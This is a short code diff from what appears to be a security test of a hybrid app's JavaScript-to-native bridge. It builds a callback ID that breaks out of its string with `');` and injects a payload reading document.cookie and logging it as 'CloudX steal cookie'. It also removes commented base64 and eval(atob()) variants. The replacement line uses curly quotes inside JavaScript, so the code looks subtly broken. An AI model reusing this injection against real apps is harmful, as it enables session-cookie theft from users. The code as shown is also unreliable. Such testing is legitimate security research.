@@ -321,19 +321,9 @@
 
 
         // 要注入的代码（移除内部重复的 payload 声明）
-        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(\"${currUrl}\") && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
-        // const base64Code = btoa(payload);
+        // const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(\"${currUrl}\") && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
+        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(‘https://h5hosting-drcn.dbankcdn.cn’) && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
-
-// 修正：1. 模板字符串用反引号 2. 不立即 eval，而是拼接 Base64 字符串（或解码后的字符串）
-// 场景1：拼接 Base64 编码后的字符串
-//         const callbackId = `${service}${genCallbackId()}');` + `eval(atob("${base64Code}"));//`;
-// 场景2：若想拼接 Base64 本身（不解码）
-//         const callbackId2 = `${service}${genCallbackId()}');${base64Code}//`;
-
-        // console.log("拼接后的 callbackId1（解码后代码）：", callbackId);
-        // console.log("拼接后的 callbackId2（Base64 编码）：", callbackId2);
-
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
         // 调用Native方法
